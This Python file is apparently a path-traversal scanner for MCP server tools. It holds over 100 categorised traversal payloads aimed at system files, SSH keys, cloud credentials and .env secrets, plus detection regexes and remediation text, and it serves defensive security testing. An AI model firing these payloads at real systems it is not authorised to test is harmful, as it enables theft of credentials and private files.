"""
Path Traversal Scanner — detects file path traversal vulnerabilities in MCP tools.

Tests 100+ payloads across 7 categories:
  1. Basic traversal (Unix + Windows)
  2. Encoding bypasses (URL, double-URL, Unicode, null byte)
  3. Path normalization bypasses
  4. Absolute path bypasses
  5. Protocol wrappers (file://, php://, etc.)
  6. Sensitive target files (system, cloud creds, SSH keys)
  7. Zip Slip archive extraction
"""

from __future__ import annotations

import logging
import re
from typing import Any

from mcpsec.client.mcp_client import MCPSecClient
from mcpsec.models import Finding, ServerProfile, Severity
from mcpsec.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

# ─── Parameter keywords ─────────────────────────────────────────────────────

PATH_PARAM_KEYWORDS = [
    "path",
    "filepath",
    "file",
    "filename",
    "dir",
    "directory",
    "folder",
    "src",
    "dest",
    "destination",
    "location",
    "name",
    "template",
    "include",
    "page",
    "doc",
    "document",
    "root",
    "resource",
    "uri",
    "url",
    "load",
    "read",
    "open",
    "import",
]

# ─── Payloads by category ───────────────────────────────────────────────────

PAYLOADS: dict[str, list[str]] = {
    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 1: BASIC TRAVERSAL
    # ═══════════════════════════════════════════════════════════════
    "basic_unix": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd",
        "/etc/passwd",
        "file:///etc/passwd",
    ],
    "basic_windows": [
        "..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\windows\\win.ini",
        "C:\\windows\\win.ini",
        "C:/windows/win.ini",
        "\\\\localhost\\c$\\windows\\win.ini",
        "file:///C:/windows/win.ini",
    ],
    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 2: ENCODING BYPASSES
    # ═══════════════════════════════════════════════════════════════
    "url_encoding": [
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "%252e%252e%252f",
        "%2e%2e%5c%2e%2e%5cetc/passwd",
    ],
    "unicode_encoding": [
        "..%c0%af..%c0%afetc/passwd",
        "..%ef%bc%8f..%ef%bc%8fetc/passwd",
        "..%c1%9c..%c1%9cetc/passwd",
        "\u002e\u002e/\u002e\u002e/etc/passwd",
        "\u3002\u3002/\u3002\u3002/etc/passwd",
    ],
    "null_byte": [
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.png",
        "../../../etc/passwd\x00",
        "../../../etc/passwd\x00.txt",
        "..\\..\\..\\windows\\win.ini%00",
        "..\\..\\..\\windows\\win.ini%00.jpg",
    ],
    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 3: PATH NORMALIZATION BYPASSES
    # ═══════════════════════════════════════════════════════════════
    "normalization_bypass": [
        "....//....//....//etc/passwd",
        "..../....//etc/passwd",
        "...\\.../etc/passwd",
        "..;/..;/etc/passwd",
        ".../.../.../etc/passwd",
        "..././..././etc/passwd",
        "..../..../etc/passwd",
        "/./../../../etc/passwd",
        "/.//../../../etc/passwd",
        "/../../../etc/passwd",
        "/..//..//../etc/passwd",
        "..%00/..%00/etc/passwd",
        "..\\..\\..\\.\\etc\\passwd",
    ],
    "mixed_separators": [
        "..\\../..\\../etc/passwd",
        "../..\\../..\\etc/passwd",
        "..%5c..%5c..%5cetc/passwd",
        "..%2f..%5c..%2fetc/passwd",
        "..%5c..%2f..%5cetc\\passwd",
    ],
    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 4: ABSOLUTE PATH BYPASS
    # ═══════════════════════════════════════════════════════════════
    "absolute_paths_unix": [
        "/etc/passwd",
        "//etc/passwd",
        "///etc/passwd",
        "/./etc/passwd",
        "/.//etc/passwd",
        "/etc/./passwd",
        "/etc/../etc/passwd",
    ],
    "absolute_paths_windows": [
        "C:\\windows\\win.ini",
        "C:/windows/win.ini",
        "C:\\\\windows\\\\win.ini",
        "//C:/windows/win.ini",
        "\\\\?\\C:\\windows\\win.ini",
        "\\\\localhost\\c$\\windows\\win.ini",
        "//?/C:/windows/win.ini",
    ],
    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 5: WRAPPER/PROTOCOL BYPASSES
    # ═══════════════════════════════════════════════════════════════
    "protocol_wrappers": [
        "file:///etc/passwd",
        "file://localhost/etc/passwd",
        "file://127.0.0.1/etc/passwd",
        "file:///C:/windows/win.ini",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=string.rot13/resource=/etc/passwd",
        "data://text/plain;base64,Li4vLi4vLi4vZXRjL3Bhc3N3ZA==",
        "zip:///tmp/test.zip#../../../etc/passwd",
        "phar:///tmp/test.phar/x/../../../etc/passwd",
    ],
    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 6: SENSITIVE TARGET FILES
    # ═══════════════════════════════════════════════════════════════
    "sensitive_files_unix": [
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/version",
        "/var/log/auth.log",
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "/root/.bash_history",
    ],
    "sensitive_files_windows": [
        "C:\\windows\\system32\\config\\SAM",
        "C:\\windows\\system32\\config\\SYSTEM",
        "C:\\windows\\repair\\SAM",
        "C:\\windows\\debug\\netsetup.log",
    ],
    "cloud_credentials": [
        "~/.aws/credentials",
        "~/.aws/config",
        "~/.azure/accessTokens.json",
        "~/.azure/azureProfile.json",
        "~/.config/gcloud/credentials.db",
        "~/.kube/config",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/app/.env",
        "/var/www/html/.env",
        ".env",
        "../.env",
        "../../.env",
    ],
    # ═══════════════════════════════════════════════════════════════
    # CATEGORY 7: ZIP SLIP (Archive Extraction)
    # ═══════════════════════════════════════════════════════════════
    "zip_slip": [
        "../../../tmp/evil.txt",
        "foo/../../../tmp/evil.txt",
        "foo/bar/../../../tmp/evil.txt",
    ],
    "write_traversal": [
        "mcpsec_test.txt",
        "../../mcpsec_test.txt",
        "C:\\windows\\temp\\mcpsec_test.txt",
        "C:/windows/temp/mcpsec_test.txt",
        "/tmp/mcpsec_test.txt",
        "../../../../../../../../../../tmp/mcpsec_test.txt",
        "C:\\mcpsec_test.txt",
    ],
}

# ─── Success indicators ──────────────────────────────────────────────────────

SUCCESS_INDICATORS: dict[str, list[str]] = {
    "etc_passwd": [
        r"root:x?:0:0",
        r"daemon:x?:\d+:\d+",
        r"nobody:x?:\d+:\d+",
        r"/bin/bash",
        r"/bin/sh",
        r"/sbin/nologin",
    ],
    "win_ini": [
        r"\[extensions\]",
        r"\[fonts\]",
        r"\[Mail\]",
        r"MAPI=1",
        r"\[MCI Extensions.BAK\]",
    ],
    "proc_self": [
        r"PATH=",
        r"HOME=",
        r"USER=",
    ],
    "ssh_keys": [
        r"-----BEGIN (RSA |OPENSSH )?PRIVATE KEY-----",
        r"ssh-rsa AAAA",
    ],
    "cloud_creds": [
        r"aws_access_key_id",
        r"aws_secret_access_key",
        r"client_secret",
        r'"token":\s*"',
    ],
    "env_file": [
        r"DATABASE_URL=",
        r"SECRET_KEY=",
        r"API_KEY=",
        r"DB_PASSWORD=",
    ],
    "write_success": [
        r"(?:exported|saved|written|downloaded|created).*(?:to|as|file).*(?:mcpsec_test\.txt|/tmp/|\\temp\\)",
        r"mcpsec_test\.txt",
    ],
    "error_leaks": [
        r"ENOENT",
        r"No such file or directory",
        r"Permission denied",
        r"Access is denied",
        r"The system cannot find",
        r"java\.io\.FileNotFoundException",
    ],
}

# Flatten payloads
_ALL_PAYLOADS = []
for category_payloads in PAYLOADS.values():
    _ALL_PAYLOADS.extend(category_payloads)


def _extract_response(result: Any) -> str:
    """Extract text from an MCP tool call result."""
    text = ""
    if hasattr(result, "content"):
        for block in result.content:
            if hasattr(block, "text"):
                text += block.text
    return text


def _check_indicators(response_text: str, raw_result: Any = None) -> tuple[str, str]:
    """
    Check response against success indicators.
    Uses response_classifier for SAFE detection first.
    Returns (evidence, confidence) — CONFIRMED, LIKELY, or empty.
    """
    from mcpsec.scanners.response_classifier import Verdict, classify_path_traversal

    verdict, evidence = classify_path_traversal(response_text, raw_result)

    if verdict == Verdict.SAFE:
        return "", ""  # Suppressed — security controls blocked the attack

    if verdict == Verdict.CONFIRMED:
        return evidence, "CONFIRMED"

    if verdict == Verdict.LIKELY:
        return evidence, "LIKELY"

    # Fall back to legacy checks for extra coverage
    for pattern in SUCCESS_INDICATORS["cloud_creds"]:
        if re.search(pattern, response_text, re.IGNORECASE):
            return f"Cloud credentials detected: {pattern}", "CONFIRMED"

    for pattern in SUCCESS_INDICATORS["env_file"]:
        if re.search(pattern, response_text, re.IGNORECASE):
            return f"Environment file contents detected: {pattern}", "CONFIRMED"

    for pattern in SUCCESS_INDICATORS["proc_self"]:
        if re.search(pattern, response_text):
            return f"/proc/self contents detected: {pattern}", "CONFIRMED"

    for pattern in SUCCESS_INDICATORS["write_success"]:
        if re.search(pattern, response_text, re.IGNORECASE):
            return f"Successful write to sensitive/traversed path: {pattern}", "LIKELY"

    return "", ""


class PathTraversalScanner(BaseScanner):
    """
    Scans for path traversal vulnerabilities using 100+ payloads
    across 7 attack categories with confirmation-based detection.
    """

    name = "path-traversal"
    description = "Detect path traversal vulnerabilities with 100+ categorized payloads"

    async def scan(
        self, profile: ServerProfile, client: MCPSecClient | None = None
    ) -> list[Finding]:
        findings: list[Finding] = []
        if not client:
            return findings

        from mcpsec.scanners.response_classifier import is_tool_relevant

        for tool in profile.tools:
            # Scanner scoping: skip tools unlikely to do file operations
            if not is_tool_relevant(tool.name, tool.description, "path-traversal"):
                continue

            # Find injectable parameters
            path_params = set()

            for param_name in tool.parameters:
                if any(kw in param_name.lower() for kw in PATH_PARAM_KEYWORDS):
                    path_params.add(param_name)

            raw_props = tool.raw_schema.get("inputSchema", {}).get("properties", {})
            for param_name, param_def in raw_props.items():
                if param_def.get("type") == "string":
                    path_params.add(param_name)

            if not path_params:
                path_params = set(tool.parameters.keys())

            for param_name in path_params:
                found_vuln = False
                for payload in _ALL_PAYLOADS:
                    if found_vuln:
                        break
                    try:
                        call_args = self._get_dummy_args(tool, param_name, payload)
                        result = await client.call_tool(tool.name, call_args)
                        response_text = _extract_response(result)
                        is_error = getattr(result, "isError", False)

                        clean_response = response_text.replace(payload, "")
                        evidence, confidence = _check_indicators(clean_response, result)

                        if evidence:
                            severity = (
                                Severity.CRITICAL if confidence == "CONFIRMED" else Severity.HIGH
                            )
                            findings.append(
                                Finding(
                                    severity=severity,
                                    scanner=self.name,
                                    tool_name=tool.name,
                                    parameter=param_name,
                                    title=f"Path Traversal in '{param_name}' [{confidence}]",
                                    description=(
                                        f"Tool '{tool.name}' is vulnerable to path traversal "
                                        f"via the '{param_name}' parameter."
                                    ),
                                    detail=f"Payload: {payload}\nResponse: {response_text[:300]}",
                                    evidence=evidence,
                                    confidence=confidence.lower(),
                                    remediation=(
                                        "Validate paths against an allowlist of permitted directories. "
                                        "Use os.path.realpath() and verify the resolved path starts "
                                        "with the intended base directory. Never pass raw user input "
                                        "to file system operations."
                                    ),
                                    cwe="CWE-22",
                                )
                            )
                            found_vuln = True

                    except Exception as e:
                        logger.debug(f"Error testing {tool.name}/{param_name}: {e}")

        return findings
